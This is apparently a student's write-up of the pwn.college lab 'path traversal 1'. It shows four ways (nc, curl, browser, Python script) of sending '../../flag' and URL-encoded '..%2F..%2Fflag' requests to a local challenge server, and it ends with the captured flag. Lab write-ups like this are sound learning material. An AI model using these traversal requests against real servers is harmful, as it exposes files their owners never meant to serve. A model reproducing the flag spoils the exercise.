# challenge: path traversal 1

📅 2026-01-17
📁 web security

---

## ✅ what i did  
I WAY -> nc
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found out the only enpoint provided by the server is /deliverables
furthermore, the server allows anything after /deliverables/ allowing us for a path traversal
the server build the requested path in the following way:
-app.root_path = /challenge
-"/files/"
-path = everything after /deliverables in the url
requested_path = /challenge/files/???
if nothing is provided after /deliverables, by default it will use index.html
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /deliverables/../../flag HTTP/1.1'
        'Host: challenge.localhost'
the requested_path=/challenge/files/../../flag is resolved in -> /flag    (../../ eliminates /challenge and /files)
-flag popped out

II WAY -> curl
-clicked start
-opened the terminal
-ran: '/challenge/server'
-ran: 'curl -v "http://challenge.localhost/deliverables/..%2F..%2Fflag"'
-flag popped out

III WAY -> browser
-clicked start
-opened the desktop
-opened the terminal
-ran: '/challenge/server'
-opened firefox
-url: "http://challenge.localhost:80/deliverables/..%2F..%2Fflag"
-flag popped out

IV WAY -> python
-clicked start
-opened the terminal
-ran: 'vim bro'
-typed: '#!/usr/bin/env python3'
        'from pwn import *'
        'import requests'
        'context.log_level = 'error''
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'url = "http://challenge.localhost/deliverables/..%2F..%2Fflag"'
        'r = requests.get(url)'
        'print(r.text)'
-ran: 'chmod a+x bro'
-ran: './bro'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
how to read server's code and retrieve the correct vulnerablity to exploit
in this case <path:path> accepts arbitrary subpaths
app.root_path is the full path in which server's code exist
to avoid curl, python and the browser to execute ../ before sending the request, use url encoding: / -> %2F    ../ -> ..%2F
in python, to wait a sec after the process has been run use time.sleep(1)

## 🏁 Flag  
pwn.college{kfk1hZNut7C5qzaFnlbIOkQPPDt.QX3gzMzwCO4IDOxEzW}
